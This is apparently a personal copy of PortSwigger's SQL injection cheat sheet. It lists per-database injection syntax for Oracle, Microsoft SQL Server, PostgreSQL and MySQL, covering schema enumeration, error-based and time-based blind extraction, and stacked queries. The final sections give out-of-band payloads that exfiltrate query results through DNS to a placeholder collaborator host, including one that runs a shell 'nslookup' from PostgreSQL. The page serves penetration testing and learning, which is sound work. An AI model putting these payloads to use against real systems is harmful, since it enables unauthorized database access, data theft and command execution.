---
title: Cheat Sheet
date: 2025-10-12
description: SQL injection cheat sheet from https://portswigger.net/web-security/sql-injection/cheat-sheet
---

This SQL injection cheat sheet contains examples of useful syntax that you can use to perform a variety of tasks that often arise when performing SQL injection attacks.

## String Concatenation

| Database   | Format                                                                                    |
| ---------- | ----------------------------------------------------------------------------------------- |
| Oracle     | `'foo'\|\|'bar'`                                                                          |
| Microsoft  | `'foo'+'bar'`                                                                             |
| PostgreSQL | `'foo'\|\|'bar'`                                                                          |
| MySQL      | `'foo' 'bar'` [Note the space between the two strings]<br />Or<br />`CONCAT('foo','bar')` |

## Substring

| Database   | Format                      |
| ---------- | --------------------------- |
| Oracle     | `SUBSTR('foobar', 4, 2)`    |
| Microsoft  | `SUBSTRING('foobar', 4, 2)` |
| PostgreSQL | `SUBSTRING('foobar', 4, 2)` |
| MySQL      | `SUBSTRING('foobar', 4, 2)` |

## Comments

| Database   | Inline Comment                                                              | Multiple-lines Comment |
| ---------- | --------------------------------------------------------------------------- | ---------------------- |
| Oracle     | `--comment`                                                                 | `/* comment */`        |
| Microsoft  | `--comment`                                                                 | `/* comment */`        |
| PostgreSQL | `--comment`                                                                 | `/* comment */`        |
| MySQL      | `#comment`<br />Or<br />`-- comment` [Note the space after the double dash] | `/* comment */`        |

## Database Version

| Database   | Query Statement                                                              |
| ---------- | ---------------------------------------------------------------------------- |
| Oracle     | `SELECT banner FROM v$version`<br />Or<br />`SELECT version FROM v$instance` |
| Microsoft  | `SELECT @@version`                                                           |
| PostgreSQL | `SELECT version()`                                                           |
| MySQL      | `SELECT @@version `                                                          |

## Database Contents

| Database   | Query Statement                                                                                                                        |
| ---------- | -------------------------------------------------------------------------------------------------------------------------------------- |
| Oracle     | `SELECT * FROM all_tables`<br />Or<br />`SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'`                           |
| Microsoft  | `SELECT * FROM information_schema.tables`<br />Or<br />`SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
| PostgreSQL | `SELECT * FROM information_schema.tables`<br />Or<br />`SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
| MySQL      | `SELECT * FROM information_schema.tables`<br />Or<br />`SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |

## Conditional Errors

| Database   | Query Statement                                                                         |
| ---------- | --------------------------------------------------------------------------------------- |
| Oracle     | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual`      |
| Microsoft  | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END`                         |
| PostgreSQL | `1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)`          |
| MySQL      | `SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')` |

## Extracting Data via Visible Error Messages

| Database   | Query Statement                                                               | Response                                                                         |
| ---------- | ----------------------------------------------------------------------------- | -------------------------------------------------------------------------------- |
| Microsoft  | `SELECT 'foo' WHERE 1 = (SELECT 'secret')`                                    | `Conversion failed when converting the varchar value 'secret' to data type int.` |
| PostgreSQL | `SELECT CAST((SELECT password FROM users LIMIT 1) AS int)`                    | `invalid input syntax for integer: "secret"`                                     |
| MySQL      | `SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))` | `XPATH syntax error: '\secret'`                                                  |

## Batched (or stacked) Queries

| Database   | Query Statement                                                       |
| ---------- | --------------------------------------------------------------------- |
| Oracle     | Does not support batched queries.                                     |
| Microsoft  | `QUERY-1-HERE; QUERY-2-HERE`<br />Or<br />`QUERY-1-HERE QUERY-2-HERE` |
| PostgreSQL | `QUERY-1-HERE; QUERY-2-HERE`                                          |
| MySQL      | `QUERY-1-HERE; QUERY-2-HERE`                                          |

## Time Delays

| Database   | Query Statement                       |
| ---------- | ------------------------------------- |
| Oracle     | `dbms_pipe.receive_message(('a'),10)` |
| Microsoft  | `WAITFOR DELAY '0:0:10'`              |
| PostgreSQL | `SELECT pg_sleep(10)`                 |
| MySQL      | `SELECT SLEEP(10) `                   |

## Conditional Time Delays

| Database   | Query Statement                                                                                                  |
| ---------- | ---------------------------------------------------------------------------------------------------------------- |
| Oracle     | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'\|\|dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual` |
| Microsoft  | `IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'`                                                                |
| PostgreSQL | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END`                                  |
| MySQL      | `SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a') `                                                                  |

## DNS Lookup

| Database   | Query Statement                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| ---------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Oracle     | (XXE) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:<br />`SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual`<br />The following technique works on fully patched Oracle installations, but requires elevated privileges:<br />`SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')` |
| Microsoft  | `exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'`                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| PostgreSQL | `copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'`                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| MySQL      | The following techniques work on Windows only:<br />`LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')`<br />Or<br />`SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'`                                                                                                                                                                                                                                                                                                                                             |

## DNS Lookup With Data Exfiltration

- Oracle

```sql
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
```

- Microsoft

```sql
declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')
```

- PostgreSQL

```sql
create OR replace function f() returns void as $$
declare c text;
declare p text;
begin
SELECT into p (SELECT YOUR-QUERY-HERE);
c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';
execute c;
END;
$$ language plpgsql security definer;
SELECT f();
```

- MySQL

The following technique works on Windows only:

```sql
SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
```

## Reference

[PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)
